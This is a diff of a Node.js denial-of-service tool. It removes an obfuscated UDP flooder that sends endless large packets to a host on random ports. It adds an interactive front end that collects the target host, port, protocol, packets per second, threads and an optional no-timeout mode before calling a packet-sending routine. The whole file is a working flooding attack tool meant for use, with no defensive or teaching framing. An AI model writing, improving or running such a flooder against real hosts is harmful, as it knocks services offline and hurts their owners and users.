@@ -1,54 +1,96 @@
-const _0x00 = require('commander');
+import inquirer from "inquirer";
+import { sendPackets } from "./utils/sendPackets.js";
 
-const _0x01 = _0x00.version('0.69.0')
-    .option('-h,  <H>', 'H N4,443/!P')
-    .option('-p,  [P]', '!f n0x00t d3f!n3d, _0x00 w!ll us3 r4nd044 P.', parseInt)
-    .option('-t,  [T]', 'T !n 44!ll!s3c. !f n0x00t d3f!n3d, !t w!ll b unl!m!t3d.', parseInt);
+async function main() {
+  const answers = await inquirer.prompt([
+    {
+      type: "input",
+      name: "host",
+      message: "Host address:",
+      validate: (input) => (input ? true : "Host address is required"),
+    },
+    {
+      type: "input",
+      name: "port",
+      message: "Port number (leave blank for random):",
+      validate: (input) =>
+        input === "" || !isNaN(parseInt(input))
+          ? true
+          : "Port must be a number",
+      filter: (input) => (input === "" ? null : parseInt(input)),
+    },
+    {
+      type: "input",
+      name: "timeout",
+      message: "Timeout in milliseconds (leave blank for unlimited):",
+      validate: (input) =>
+        input === "" || !isNaN(parseInt(input))
+          ? true
+          : "Timeout must be a number",
+      filter: (input) => (input === "" ? null : parseInt(input)),
+    },
+    {
+      type: "rawlist",
+      name: "protocol",
+      message: "Choose the protocol(1 or 2):",
+      choices: ["TCP", "UDP"],
+    },
+    {
+      type: "input",
+      name: "packets",
+      message: "Packets per second:",
+      validate: (input) =>
+        !isNaN(parseInt(input)) ? true : "Packets must be a number",
+      filter: (input) => parseInt(input),
+    },
+    {
+      type: "input",
+      name: "threads",
+      message: "Number of threads:",
+      validate: (input) =>
+        !isNaN(parseInt(input)) ? true : "Threads must be a number",
+      filter: (input) => parseInt(input),
+    },
+  ]);
 
-_0x01.parse(process.argv);
+  console.log(`Host: ${answers.host}`);
+  if (answers.host) {
+    if (!answers.timeout) {
+      const confirm = await inquirer.prompt([
+        {
+          type: "confirm",
+          name: "continueWithoutTimeout",
+          message: "Are you sure you want to continue without a timeout?",
+          default: false,
+        },
+      ]);
 
-if (_0x00.host) {
-    if (!_0x00.timeout) {
-        _0x00.confirm('R U sur3 U wAnt t0 c0nt!nu3 w!thouT t!m30uT?', function (_0x003) {
-            if (!_0x003) {
-                console.log("0K, !'ll ST0x00P h3r3.");
-                process.stdin.destroy();
-            } else {
-                _0x09(_0x00.host, _0x00.port, _0x00.port);
-            }
-
-        });
+      if (!confirm.continueWithoutTimeout) {
+        console.log("Okay, I'll stop here.");
+        process.exit();
+      } else {
+        sendPackets(
+          answers.host,
+          answers.port,
+          null,
+          answers.protocol,
+          answers.packets,
+          answers.threads
+        );
+        console.log("Packets sent without a timeout.");
+      }
     } else {
-        _0x09(_0x00.host, _0x00.port, _0x00.timeout);
+      sendPackets(
+        answers.host,
+        answers.port,
+        answers.timeout,
+        answers.protocol,
+        answers.packets,
+        answers.threads
+      );
+      console.log(`Packets sent with a timeout of ${answers.timeout} ms.`);
     }
-} else {
-    _0x01.help();
+  }
 }
 
-
-function _0x09(h, p, t) {
-    let H_0 = h;
-    let D_0 = require('dgram');
-    let C_0 = dgram.createSocket('udp4');
-
-    let O_0 = "";
-    for (let _0x005 = 65553; _0x005 >= 0; _0x005--) {
-        O_0 += "X";
-    };
-    let ST_0 = new Date();
-    while (1) {
-        if (t) {
-            let NT_0 = new Date();
-            if (NT_0.getTime() >= (ST_0.getTime() + t)) {
-                break;
-            }
-        }
-        let _0x006 = new Buffer(O_0);
-        (function (p) {
-            C_0.send(_0x006, 0, _0x006.length, p, h, function (err, bytes) {
-                if (err) throw err;
-                console.log('U R DP _0x006 sNt t0x00 ' + h + ':' + p);
-            });
-        })(p || Math.floor(Math.random() * (65553) + 1));
-    }
-}
+main();
